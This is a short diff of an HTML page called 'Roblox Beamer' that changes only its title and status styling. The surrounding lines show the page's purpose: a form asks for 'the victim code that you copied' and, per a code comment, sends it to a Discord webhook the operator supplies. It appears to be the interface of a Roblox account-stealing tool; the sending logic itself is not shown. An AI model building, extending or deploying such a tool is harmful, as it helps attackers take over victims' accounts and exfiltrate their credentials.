@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Beamer</title>
+  <title>testRoblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -36,6 +36,10 @@
     button:hover:not(:disabled) {
       background-color: #0056b3;
     }
+    #status {
+      color: green;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
@@ -44,7 +48,7 @@
     <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea>
     <button id="sendButton" onclick="sendMessage()">Send</button>
   </div>
-  <p id="status" style="color: green; font-weight: bold;"></p>
+  <p id="status"></p>
 
   <script>
     // Replace with your Discord Webhook URL
